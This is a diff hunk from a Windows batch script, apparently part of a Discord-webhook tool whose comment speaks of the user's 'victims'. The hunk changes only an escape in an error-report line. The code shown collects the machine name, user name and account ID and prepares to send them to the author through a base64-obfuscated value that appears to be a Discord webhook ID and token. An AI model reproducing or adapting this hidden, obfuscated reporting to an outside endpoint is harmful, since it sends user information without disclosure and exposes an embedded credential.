@@ -399,7 +399,7 @@ for /f "delims=" %%a in ('powershell "$text = Get-Content "%temp%\Embed.json" -R
     if "!JSON_INVALID!"=="true" (
         REM REPORT ISSUE TO THE APPLICATION AUTHOR
         REM PLEASE NOTE: I WILL NEVER TRY TO HARM YOU, YOUR VICTIMS OR YOUR COMPUTERS
-        >"%temp%\ErrorTraceMSG.json" echo {"username":"","content":"\nAn Issue has been tracked while verifying the json formatting for the message _(file attached)_:\n\n**INFORMATION:**\nAccount ID: `!AccountID!`\nHOST: %computername%\%username%\nFail Reason: _!JSON_FAILED!_\n\n[|| <@&928041407703289856> <@&928041254376325120> <@&929161198862213220> ||]\n","embeds":[],"components":[]}
+        >"%temp%\ErrorTraceMSG.json" echo {"username":"","content":"\nAn Issue has been tracked while verifying the json formatting for the message _(file attached)_:\n\n**INFORMATION:**\nAccount ID: `!AccountID!`\nHOST: %computername%\\%username%\nFail Reason: _!JSON_FAILED!_\n\n[|| <@&928041407703289856> <@&928041254376325120> <@&929161198862213220> ||]\n","embeds":[],"components":[]}
 
         for /f "delims=" %%c in ('powershell "[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(""""LzkzNDU4MzkxODI2NTUyMDIwOC8wMVg0LVFXWjVnbUNJeUdDbHgzRS1oeER2bUJVTDF5MmlYZmZiQ1ZpelgyVURLV2ZGZVVSdVFFanBFNDY1dzZjT1dNVw==""""))"') do set "BSIXTY4=%%c"
 
